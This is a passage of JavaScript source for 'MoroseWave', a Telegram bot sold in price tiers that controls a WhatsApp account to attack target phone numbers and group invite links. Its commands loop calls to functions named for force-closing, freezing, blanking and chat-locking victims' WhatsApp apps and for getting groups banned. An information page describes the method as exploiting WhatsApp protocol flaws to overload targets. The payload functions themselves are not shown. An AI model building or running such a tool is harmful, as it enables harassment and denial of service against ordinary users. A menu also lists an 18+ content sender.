            await ctx.telegram.editMessageText(ctx.chat.id, loadingMessage.message_id, null, frame.text, { parse_mode: "HTML" });
            await new Promise(resolve => setTimeout(resolve, frame.delay));
        } catch (error) {
            if (error.response && error.response.error_code === 400) continue;
        }
    }
    try {
        await ctx.telegram.deleteMessage(ctx.chat.id, loadingMessage.message_id);
    } catch (error) {}

    const opts = {
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: [
                [
                    { text: "🔴 MERAH", callback_data: "warna_merah", style: "danger", icon_custom_emoji_id: "5440703719752608257" },
                    { text: "🟢 HIJAU", callback_data: "warna_hijau", style: "success", icon_custom_emoji_id: "5316556616319905664" }
                ],
                [
                    { text: "🔵 BIRU", callback_data: "warna_biru", style: "primary", icon_custom_emoji_id: "5330237710655306682" },
                    { text: "🌈 DISKO", callback_data: "warna_disko", style: "danger", icon_custom_emoji_id: "5244968767150109583" }
                ]
            ]
        }
    };
    if (ctx.chat.type === 'private') {
        opts.message_effect_id = "5104841245755180586";
    }
    await ctx.reply("🎨 Pilih warna tema kamu:", opts);
});

// ======================
// CALLBACK PILIH WARNA → TAMPILKAN MENU PEMBUKA (VIDEO)
// ======================
bot.action(['warna_merah', 'warna_hijau', 'warna_biru', 'warna_disko'], async (ctx) => {
    let warna = 'hijau';
    if (ctx.match[0] === 'warna_merah') warna = 'merah';
    if (ctx.match[0] === 'warna_hijau') warna = 'hijau';
    if (ctx.match[0] === 'warna_biru') warna = 'biru';
    if (ctx.match[0] === 'warna_disko') warna = 'disko';

    userWarna.set(ctx.from.id, warna);
    await ctx.answerCbQuery(`Warna ${warna.toUpperCase()} dipilih!`);
    await ctx.deleteMessage();

    const userId = ctx.from.id;
    const username = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name || "User";
    const senderStatus = isWhatsAppConnected ? "✅ CONNECTED" : "❌ DISCONNECTED";
    const runtime = formatRuntime();
    const style = (warna === 'disko') ? getDiskoStyle() : getStyle(warna);

    const openingCaption = getOpeningMenuCaption(username, userId, senderStatus, runtime);

    const keyboard = {
        inline_keyboard: [
            [
                {
                    text: "𝗦𝗛𝗢𝗪 𝗦𝗖𝗥𝗜𝗣𝗧",
                    callback_data: "open_script",
                    style: style,
                    icon_custom_emoji_id: getRandomIconId()
                }
            ],
            [
                {
                    text: "𝗔𝗨𝗧𝗢 𝗨𝗣𝗗𝗔𝗧𝗘",
                    callback_data: "update_now",
                    style: style,
                    icon_custom_emoji_id: getRandomIconId()
                }
            ]
        ]
    };

    const options = {
        caption: openingCaption,
        parse_mode: "HTML",
        reply_markup: keyboard
    };

    if (ctx.chat.type === 'private') {
        options.message_effect_id = "5104841245755180586";
    }

    await ctx.replyWithVideo(thumbnailVideo, options);
});

// ======================
// OPEN SCRIPT → MENU HOME (edit ke foto)
// ======================
bot.action('open_script', async (ctx) => {
    const userId = ctx.from.id;
    const warna = userWarna.get(userId) || 'hijau';
    const premiumStatus = isPremiumUser(userId) ? "Yes" : "No";
    const senderStatus = isWhatsAppConnected ? "Yes" : "No";
    const runtimeStatus = formatRuntime();

    const menuMessage = getMenuCaption(premiumStatus, ctx.from.first_name, userId, senderStatus, runtimeStatus, 1);
    const keyboard = getMenuHome(warna);

    try {
        await ctx.editMessageMedia(
            { type: 'photo', media: thumbnailUrl, caption: menuMessage, parse_mode: "HTML" },
            { reply_markup: { inline_keyboard: keyboard } }
        );
        await ctx.answerCbQuery();
    } catch (error) {
        if (error.response?.error_code === 400) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error:", error);
        }
    }
});

// ======================
// MENU HOME (PAGE 1/6)
// ======================
bot.action('menu_home', async (ctx) => {
    const userId = ctx.from.id;
    const warna = userWarna.get(userId) || 'hijau';
    const premiumStatus = isPremiumUser(userId) ? "Yes" : "No";
    const senderStatus = isWhatsAppConnected ? "Yes" : "No";
    const runtimeStatus = formatRuntime();

    const menuMessage = getMenuCaption(premiumStatus, ctx.from.first_name, userId, senderStatus, runtimeStatus, 1);
    const keyboard = getMenuHome(warna);

    try {
        await ctx.editMessageMedia({ type: 'photo', media: thumbnailUrl, caption: menuMessage, parse_mode: "HTML" }, { reply_markup: { inline_keyboard: keyboard } });
        await ctx.answerCbQuery();
    } catch (error) {
        if (error.response?.error_code === 400) await ctx.answerCbQuery();
        else console.error("Error:", error);
    }
});

bot.action('menu_controls', async (ctx) => {
    const warna = userWarna.get(ctx.from.id) || 'hijau';
    const controlsMenu = `
<pre><code class="language-javascript">
[ CONTROLS | v32.0 ]

[ SYSTEM ]
  /addbot - Add Sender
  /setcd - Set Cooldown
  /killsesi - Reset Session

[ USER ]
  /addprem - Add Premium
  /delprem - Delete Premium
  /addpremgrup - Add Group Prem
  /delpremgrup - Delete Group Prem
  /blockcmd - Block Command
  /unblockcmd - Unblock Command
  /listblockcmd - List Blocked

[ PAGE 2/6 ]
</code></pre>`;
    const keyboard = getMenuControls(warna);
    try {
        await ctx.editMessageCaption(controlsMenu, { parse_mode: "HTML", reply_markup: { inline_keyboard: keyboard } });
        await ctx.answerCbQuery();
    } catch (error) { if (error.response?.error_code === 400) await ctx.answerCbQuery(); else console.error(error); }
});

bot.action('menu_homecontrols', async (ctx) => {
    const warna = userWarna.get(ctx.from.id) || 'hijau';
    const text = `
<pre><code class="language-javascript">
[ CONTROL PANEL ]

Menu ini digunakan untuk mengontrol dan mengatur bot.
Anda dapat menambah sender, mengatur cooldown, reset session,
serta mengelola user premium dan grup premium.

[ PAGE 2/6 ]
</code></pre>`;
    const keyboard = getMenuControls(warna);
    try {
        await ctx.editMessageCaption(text, { parse_mode: "HTML", reply_markup: { inline_keyboard: keyboard } });
        await ctx.answerCbQuery();
    } catch (error) { if (error.response?.error_code === 400) await ctx.answerCbQuery(); else console.error(error); }
});

bot.action('menu_toolss', async (ctx) => {
    const warna = userWarna.get(ctx.from.id) || 'hijau';
    const toolssMenu = `
<pre><code class="language-javascript">
[ TOOLS | v32.0 ]

[ DEVICE & GEN ]
  /iqc - iPhone Gen
  /sendbokep - Private Tools 18+
  /tiktoksearch - Search TikTok
  /play - Spotify
  /enchtml - Encrypt HTML
  /fixcode - Fix File.js

[ MEDIA & DL ]
  /brat - Brat Sticker
  /tiktok - TikTok Downloader
  /tourl - Image to URL
  /fakecall - Photo to Avatar
  /cekkontol - Check Gender
  /cekkhodam - Check Khodam

[ PAGE 3/6 ]
</code></pre>`;
    const keyboard = getMenuToolss(warna);
    try {
        await ctx.editMessageCaption(toolssMenu, { parse_mode: "HTML", reply_markup: { inline_keyboard: keyboard } });
        await ctx.answerCbQuery();
    } catch (error) { if (error.response?.error_code === 400) await ctx.answerCbQuery(); else console.error(error); }
});

bot.action('menu_hometoolss', async (ctx) => {
    const warna = userWarna.get(ctx.from.id) || 'hijau';
    const text = `
<pre><code class="language-javascript">
[ TOOLS PANEL ]

Menu ini berisi berbagai tools dan utilitas yang tersedia.
Anda dapat generate device, mencari tiktok, downloader media,
membuat sticker brat, convert media ke url, dan lainnya.

[ PAGE 3/6 ]
</code></pre>`;
    const keyboard = getMenuToolss(warna);
    try {
        await ctx.editMessageCaption(text, { parse_mode: "HTML", reply_markup: { inline_keyboard: keyboard } });
        await ctx.answerCbQuery();
    } catch (error) { if (error.response?.error_code === 400) await ctx.answerCbQuery(); else console.error(error); }
});

bot.action('menu_bug', async (ctx) => {
    const warna = userWarna.get(ctx.from.id) || 'hijau';
    const bugMenu = `
<pre><code class="language-javascript">
[ TRASH | v32.0 ]

[ CAN SPAM ]
  /Xspamv1 - Delay tag sw
  /Xspamv2 - Delay type album

Note: 
 • Nomor Wajib Bisa Chat Agar Tidak Mudah Kena Limit

[ PAGE 4/6 ]
</code></pre>`;
    const keyboard = getMenuBug(warna);
    try {
        await ctx.editMessageCaption(bugMenu, { parse_mode: "HTML", reply_markup: { inline_keyboard: keyboard } });
        await ctx.answerCbQuery();
    } catch (error) { if (error.response?.error_code === 400) await ctx.answerCbQuery(); else console.error(error); }
});

bot.action('menu_bug2', async (ctx) => {
    const warna = userWarna.get(ctx.from.id) || 'hijau';
    const bugMenu2 = `
<pre><code class="language-javascript">
[ TRASH | v32.0 ]
 
[ NUMBER BUG ]
  /morobug - Bug With Button
  
[ PAGE 4/6 ]
</code></pre>`;
    const keyboard = getMenuBug(warna);
    try {
        await ctx.editMessageCaption(bugMenu2, { parse_mode: "HTML", reply_markup: { inline_keyboard: keyboard } });
        await ctx.answerCbQuery();
    } catch (error) { if (error.response?.error_code === 400) await ctx.answerCbQuery(); else console.error(error); }
});

bot.action('menu_bug3', async (ctx) => {
    const warna = userWarna.get(ctx.from.id) || 'hijau';
    const bugMenu3 = `
<pre><code class="language-javascript">
[ GROUP BUG | v32.0 ]
 
[ GROUP BUG ]
  /morogroupv1 - Ban Group
  
[ PAGE 4/6 ]
</code></pre>`;
    const keyboard = getMenuBug(warna);
    try {
        await ctx.editMessageCaption(bugMenu3, { parse_mode: "HTML", reply_markup: { inline_keyboard: keyboard } });
        await ctx.answerCbQuery();
    } catch (error) { if (error.response?.error_code === 400) await ctx.answerCbQuery(); else console.error(error); }
});

bot.action('menu_homebugs', async (ctx) => {
    const warna = userWarna.get(ctx.from.id) || 'hijau';
    const text = `
<pre><code class="language-javascript">
[ BUG PANEL ]

Menu ini berisi kumpulan bug yang tersedia.
Gunakan dengan bijak dan bertanggung jawab.
Setiap command memiliki fungsi yang berbeda-beda.

[ PAGE 4/6 ]
</code></pre>`;
    const keyboard = getMenuBug(warna);
    try {
        await ctx.editMessageCaption(text, { parse_mode: "HTML", reply_markup: { inline_keyboard: keyboard } });
        await ctx.answerCbQuery();
    } catch (error) { if (error.response?.error_code === 400) await ctx.answerCbQuery(); else console.error(error); }
});

bot.action('menu_tqto', async (ctx) => {
    const warna = userWarna.get(ctx.from.id) || 'hijau';
    const tqtoMenu = `
<pre><code class="language-javascript">
[ CREDIT | v32.0 ]

  @Luctadvorisme (Dev)
  @kohxzy (Dev)
  All Buyers & Users
  Everything is Nothing.

[ PAGE 5/6 ]
</code></pre>`;
    const keyboard = getMenuTqto(warna);
    try {
        await ctx.editMessageCaption(tqtoMenu, { parse_mode: "HTML", reply_markup: { inline_keyboard: keyboard } });
        await ctx.answerCbQuery();
    } catch (error) { if (error.response?.error_code === 400) await ctx.answerCbQuery(); else console.error(error); }
});

bot.action('menu_hometqto', async (ctx) => {
    const warna = userWarna.get(ctx.from.id) || 'hijau';
    const text = `
<pre><code class="language-javascript">
[ CREDIT PANEL ]

Terima kasih telah menggunakan MoroseWave Bot

[ PAGE 5/6 ]
</code></pre>`;
    const keyboard = getMenuTqto(warna);
    try {
        await ctx.editMessageCaption(text, { parse_mode: "HTML", reply_markup: { inline_keyboard: keyboard } });
        await ctx.answerCbQuery();
    } catch (error) { if (error.response?.error_code === 400) await ctx.answerCbQuery(); else console.error(error); }
});

bot.action('menu_information', async (ctx) => {
    const warna = userWarna.get(ctx.from.id) || 'hijau';
    const informationMenu = `
<pre><code class="language-javascript">
[ INFORMATION | v32.0 ]

  WhatsApp Bug Concept

  Metode yang digunakan dalam bot ini adalah
  eksploitasi celah keamanan pada protokol WhatsApp.

  Cara Kerja:
  - Mengirim payload berulang ke target
  - Memanfaatkan delay response server
  - Overload koneksi target

  Peringatan:
  Gunakan dengan bijak dan tanggung jawab sendiri.
  Developer tidak bertanggung jawab atas penyalahgunaan.

[ PAGE 6/6 ]
</code></pre>`;
    const keyboard = getMenuInformation(warna);
    try {
        await ctx.editMessageCaption(informationMenu, { parse_mode: "HTML", reply_markup: { inline_keyboard: keyboard } });
        await ctx.answerCbQuery();
    } catch (error) { if (error.response?.error_code === 400) await ctx.answerCbQuery(); else console.error(error); }
});

bot.action('menu_price', async (ctx) => {
    const warna = userWarna.get(ctx.from.id) || 'hijau';
    const priceMenu = `
<pre><code class="language-javascript">
[ PRICE SCRIPT | v32.0 ]

  𝐌𝐎𝐑𝐎𝐒𝐄𝐖𝐀𝐕𝐄

  ➣ SCRIPT : 20k
  ➣ RESS   : 25k
  ➣ PT     : 30k
  ➣ MODZ   : 35k
  ➣ TK     : 40k
  ➣ CEO    : 50k
  ➣ OWN    : 60k

[ PAGE 6/6 ]
</code></pre>`;
    const keyboard = getMenuPrice(warna);
    try {
        await ctx.editMessageCaption(priceMenu, { parse_mode: "HTML", reply_markup: { inline_keyboard: keyboard } });
        await ctx.answerCbQuery();
    } catch (error) { if (error.response?.error_code === 400) await ctx.answerCbQuery(); else console.error(error); }
});
/// --------- CASE BUG 2 BERBUTONN -------- ///
const clickedUsers = {};

bot.command("morobug", checkWhatsAppConnection, checkCooldown, checkCommandEnabled, async (ctx) => {

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("🪧 Example : /morobug 62xx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.replyWithPhoto(
    thumbnailUrl,
    {
      caption: `
<pre><code class="language-javascript">
[ MOROSEWAVE | v32.0 ]

Target : ${q}
Status : Ready
Note : No Spam Bug
Silahkan Pilih bug di bawah...
</code></pre>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "ForceClose Click", callback_data: `click_${target}` },
            { text: "Blank Infinity", callback_data: `blank_${target}` }
          ],
          [
            { text: "Lock Chat", callback_data: `lockchat_${target}` },
            { text: "Spam Ceramah", callback_data: `ceramah_${target}` }
          ]
        ]
      }
    }
  );

});


bot.on("callback_query", async (ctx) => {

  const userId = ctx.from.id;
  const data = ctx.callbackQuery.data;

  const [key, target] = data.split("_");

  if (clickedUsers[userId]) {
    return ctx.answerCbQuery("⚠️ Kamu sudah memilih tombol ini!", { show_alert: true });
  }

  clickedUsers[userId] = true;

  await ctx.answerCbQuery();
  await ctx.deleteMessage();


  const methods = {

    click: {
      name: "click",
      func: async (t) => {
        for (let i = 0; i < 2; i++) {
          await XGrenFcClick(sock, target);
          await sleep(500);
        }
      }
    },

    crash: {
      name: "crash",
      func: async (t) => {
        for (let i = 0; i < 15; i++) {
          await NullFrezee(sock, target);
          await sleep(500);
        }
      }
    },
    
    invisv1: {
      name: "invisv1",
      func: async (t) => {
        for (let i = 0; i < 25; i++) {
          await DelayNewV10(sock, target);
          await sleep(800);
        }
      }
    },

    invisv2: {
      name: "invisv2",
      func: async (t) => {
        for (let i = 0; i < 20; i++) {
          await DelayFreezeKxa(sock, target);
          await sleep(750);
        }
      }
    },
    
    blank: {
      name: "blank",
      func: async (t) => {
        for (let i = 0; i < 10; i++) {
          await Blank(sock, target);
          await sleep(500);
        }
      }
    },
    
    lockchat: {
      name: "lockchat",
      func: async (t) => {
        for (let i = 0; i < 2; i++) {
          await NewLock(sock, target);
          await sleep(500);
        }
      }
    },

    ceramah: {
      name: "ceramah",
      func: async (t) => {
        for (let i = 0; i < 1; i++) {
          await topsvideo(sock, target);
        }
      }
    },

  };


  const method = methods[key];
  if (!method) {
    delete clickedUsers[userId];
    return;
  }

  if (!isPremiumUser(userId) && ctx.chat.type === "private") {
    delete clickedUsers[userId];
    return ctx.reply("❌ Khusus user premium atau grup premium.", { parse_mode: "HTML" });
  }


  let msg;
  try {

    msg = await ctx.replyWithPhoto(
      thumbnailUrl,
      {
        caption: `
<pre><code class="language-javascript">
[ MOROSEWAVE | v32.0 ]

Target : ${target.split("@")[0]}
Method : ${method.name}
Note : No Spam Bug
Process : [░░░░░░░░░░] 0%
</code></pre>`,
        parse_mode: "HTML"
      }
    );

    const attack = method.func(target);

    for (let i = 1; i <= 10; i++) {

      const bar = "█".repeat(i) + "░".repeat(10 - i);

      try {
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          msg.message_id,
          null,
          `
<pre><code class="language-javascript">
[ MOROSEWAVE | v32.0 ]

Target : ${target.split("@")[0]}
Method : ${method.name}
Note : No Spam Bug
Process : [${bar}] ${i * 10}%
</code></pre>`,
          { parse_mode: "HTML" }
        );
      } catch (e) {
        if (!e.description?.includes("message is not modified")) {
          console.log("Edit caption error:", e.message);
        }
      }

      await sleep(1000);
    }


    await attack;


    try {
      await ctx.telegram.editMessageCaption(
        ctx.chat.id,
        msg.message_id,
        null,
        `
<pre><code class="language-javascript">
[ MOROSEWAVE | v32.0 ]

Target : ${target.split("@")[0]}
Method : ${method.name}
Note : No Spam Bug
Process : [██████████] 100%
</code></pre>`,
        { parse_mode: "HTML" }
      );
    } catch (e) {
      console.log("Final edit error:", e.message);
    }

  } catch (err) {
    console.error("Callback error:", err);
    if (msg) {
      try { await ctx.telegram.editMessageCaption(ctx.chat.id, msg.message_id, null, `❌ Error: ${err.message}`); } catch (_) {}
    }
  } finally {
    delete clickedUsers[userId];
  }

});

bot.catch((err, ctx) => {
  if (err.description && err.description.includes("query is too old")) return;
  console.error(`Error for ${ctx.updateType}:`, err);
});
//CASE BUG CAN SPAM TARGET
bot.command("Xspamv1", checkWhatsAppConnection, checkCooldown, checkCommandEnabled, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Format: /Xspamv1 62xxx`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
    return ctx.reply("Grup belum terdaftar sebagai PREMIUM.");
  }

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
    caption: `
<pre><code class="language-javascript">
[ MOROSEWAVE | v32.0 ]

Target: ${q}
Status: Process
</code></pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "5334998226636390258" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 1; i++) {
    await GrenXDelay(sock, target);
    await sleep(500);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<pre><code class="language-javascript">
[ MOROSEWAVE | v32.0 ]

Target: ${q}
Status: Success
</code></pre>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "5334998226636390258" }
      ]]
    }
  });
});

bot.command("Xspamv2", checkWhatsAppConnection, checkCooldown, checkCommandEnabled, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Format: /Xspamv2 62xxx`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
    return ctx.reply("Grup belum terdaftar sebagai PREMIUM.");
  }

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
    caption: `
<pre><code class="language-javascript">
[ MOROSEWAVE | v32.0 ]

Target: ${q}
Status: Process
</code></pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "5334998226636390258" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 2; i++) {
    await GrenXAlbumDelay(sock, target);
    await sleep(500);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<pre><code class="language-javascript">
[ MOROSEWAVE | v32.0 ]

Target: ${q}
Status: Success
</code></pre>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "5334998226636390258" }
      ]]
    }
  });
});

bot.command("Xspamv3", checkWhatsAppConnection, checkCooldown, checkCommandEnabled, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Format: /Xspamv3 62xxx`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
    return ctx.reply("Grup belum terdaftar sebagai PREMIUM.");
  }

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
    caption: `
<pre><code class="language-javascript">
[ MOROSEWAVE | v32.0 ]

Target: ${q}
Status: Process
</code></pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "5334998226636390258" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 25; i++) {
    await DelayXFrezeeInvis(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<pre><code class="language-javascript">
[ MOROSEWAVE | v32.0 ]

Target: ${q}
Status: Success
</code></pre>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "5334998226636390258" }
      ]]
    }
  });
});

bot.command("Xspamv4", checkWhatsAppConnection, checkCooldown, checkCommandEnabled, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Format: /Xspamv4 62xxx`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
    return ctx.reply("Grup belum terdaftar sebagai PREMIUM.");
  }

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
    caption: `
<pre><code class="language-javascript">
[ MOROSEWAVE | v32.0 ]

Target: ${q}
Status: Process
</code></pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "5334998226636390258" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 12; i++) {
    await BuldozerNew(sock, target);
    await sleep(500);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<pre><code class="language-javascript">
[ MOROSEWAVE | v32.0 ]

Target: ${q}
Status: Success
</code></pre>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "5334998226636390258" }
      ]]
    }
  });
});

bot.command("Xspamv5", checkWhatsAppConnection, checkCooldown, checkCommandEnabled, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Format: /Xspamv5 62xxx`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
    return ctx.reply("Grup belum terdaftar sebagai PREMIUM.");
  }

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
    caption: `
<pre><code class="language-javascript">
[ MOROSEWAVE | v32.0 ]

Target: ${q}
Status: Process
</code></pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "5334998226636390258" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 1; i++) {
    await MediaFreezeData(sock, target);
    await sleep(500);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<pre><code class="language-javascript">
[ MOROSEWAVE | v32.0 ]

Target: ${q}
Status: Success
</code></pre>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "5334998226636390258" }
      ]]
    }
  });
});


//CASE BUG GROUP
bot.command("morogroupv1", checkWhatsAppConnection, checkCooldown, checkCommandEnabled, checkPremium, async (ctx) => {
    let input = ctx.message.text.split(" ").slice(1).join(" ");
    if (!input) return ctx.reply("☇ Format: /morogroupv1 https://chat.whatsapp.com/xxxxx");
    
    let inviteCode = input;
    const match = input.match(/chat\.whatsapp\.com\/([A-Za-z0-9]+)/);
    if (match) inviteCode = match[1];

    const msg = await ctx.reply(`<pre><code class="language-javascript">
✘ MOROSEWAVE ATTACK GROUP ✘
♛ Target   : ${input}
♛ Status   : Processing
♛ Loop     : 10
♛ Delay    : 2000ms
</code></pre>`, {
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: [
                [
                    { text: "CEK GROUP", url: `${input}`, style: "danger" }
                ]
            ]
        }
    });

    try {
        const groupInfo = await sock.groupGetInviteInfo(inviteCode).catch(() => null);
        if (!groupInfo) {
            return ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, undefined, `<pre><code class="language-javascript">
✘ MOROSEWAVE ATTACK GROUP ✘
♛ Target   : ${input}
♛ Status   : Failed
♛ Reason   : Link invalid/expired
</code></pre>`, {
                parse_mode: "HTML"
            });
        }

        const groupJid = groupInfo.id;
        const groupName = groupInfo.subject || 'Unknown';

        const isBotInGroup = groupInfo.participants?.some(p => p.id === sock.user.id);
        if (!isBotInGroup) {
            await sock.groupAcceptInvite(inviteCode).catch(() => null);
        }

        await ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, undefined, `<pre><code class="language-javascript">
✘ MOROSEWAVE ATTACK GROUP ✘
♛ Group    : ${groupName}
♛ Target   : ${input}
♛ Status   : SUCCESS
♛ Delay    : 2000ms
</code></pre>`, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "CEK GROUP", url: `${input}`, style: "danger" }
                    ]
                ]
            }
        });

        let success = 0;
        for (let i = 0; i < 1; i++) {
            try {
                await BanGroupNewV19(sock, groupJid);
                success++;
                console.log(`✅ [${i+1}/3] BanGroup executed`);
            } catch (err) {
                console.log(`❌ [${i+1}/3] Failed: ${err.message}`);
            }
            await sleep(2000);
        }

        await ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, undefined, `<pre><code class="language-javascript">
✘ MOROSEWAVE ATTACK GROUP ✘
♛ Group    : ${groupName}
♛ Target   : ${input}
♛ Status   : Success
♛ Success  : ${success}
</code></pre>`, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "CEK GROUP", url: `${input}`, style: "success" }
                    ]
                ]
            }
        });

    } catch (error) {
        console.error('[BANGROUP] Error:', error);
        await ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, undefined, `<pre><code class="language-javascript">
✘ MOROSEWAVE ATTACK GROUP ✘
♛ Target   : ${input}
♛ Status   : Failed
♛ Reason   : ${error.message}
</code></pre>`, {
            parse_mode: "HTML"
        });
    }
});

bot.command("morogroupv2", checkWhatsAppConnection, checkCooldown, checkCommandEnabled, async (ctx) => {
    let input = ctx.message.text.split(" ").slice(1).join(" ");
    if (!input) return ctx.reply("☇ Format: /morogroupv2 https://chat.whatsapp.com/xxxxx");
    
    let inviteCode = input;
    const match = input.match(/chat\.whatsapp\.com\/([A-Za-z0-9]+)/);
    if (match) inviteCode = match[1];

    const msg = await ctx.reply(`<pre><code class="language-javascript">
✘ MOROSEWAVE ATTACK GROUP ✘
♛ Target   : ${input}
♛ Status   : Processing
♛ Loop     : 10
♛ Delay    : 2000ms
</code></pre>`, {
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: [
                [
                    { text: "CEK GROUP", url: `${input}`, style: "danger" }
                ]
            ]
        }
    });

    try {
        const groupInfo = await sock.groupGetInviteInfo(inviteCode).catch(() => null);
        if (!groupInfo) {
            return ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, undefined, `<pre><code class="language-javascript">
✘ MOROSEWAVE ATTACK GROUP ✘
♛ Target   : ${input}
♛ Status   : Failed
♛ Reason   : Link invalid/expired
</code></pre>`, {
                parse_mode: "HTML"
            });
        }

        const groupJid = groupInfo.id;
        const groupName = groupInfo.subject || 'Unknown';

        const isBotInGroup = groupInfo.participants?.some(p => p.id === sock.user.id);
        if (!isBotInGroup) {
            await sock.groupAcceptInvite(inviteCode).catch(() => null);
        }

        await ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, undefined, `<pre><code class="language-javascript">
✘ MOROSEWAVE ATTACK GROUP ✘
♛ Group    : ${groupName}
♛ Target   : ${input}
♛ Status   : SUCCESS
♛ Delay    : 2000ms
</code></pre>`, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "CEK GROUP", url: `${input}`, style: "danger" }
                    ]
                ]
            }
        });

        let success = 0;
        for (let i = 0; i < 1; i++) {
            try {
                await andro_chatlock_group(sock, groupJid);
                success++;
                console.log(`✅ [${i+1}/3] BanGroup executed`);
            } catch (err) {
                console.log(`❌ [${i+1}/3] Failed: ${err.message}`);
            }
            await sleep(2000);
        }

        await ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, undefined, `<pre><code class="language-javascript">
✘ MOROSEWAVE ATTACK GROUP ✘
♛ Group    : ${groupName}
♛ Target   : ${input}
♛ Status   : Success
♛ Success  : ${success}
</code></pre>`, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "CEK GROUP", url: `${input}`, style: "success" }
                    ]
                ]
            }
        });

    } catch (error) {
        console.error('[BUGGROUP] Error:', error);
        await ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, undefined, `<pre><code class="language-javascript">
✘ MOROSEWAVE ATTACK GROUP ✘
♛ Target   : ${input}
♛ Status   : Failed
♛ Reason   : ${error.message}
</code></pre>`, {
            parse_mode: "HTML"
        });
    }
});
//END CASE BUG

bot.command("testfunction", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
    try {
      const args = ctx.message.text.split(" ")
      if (args.length < 3)
        return ctx.reply("🪧 ☇ Format: /testfunction 62××× 5 (reply function)")

      const q = args[1]
      const jumlah = Math.max(0, Math.min(parseInt(args[2]) || 1, 500))
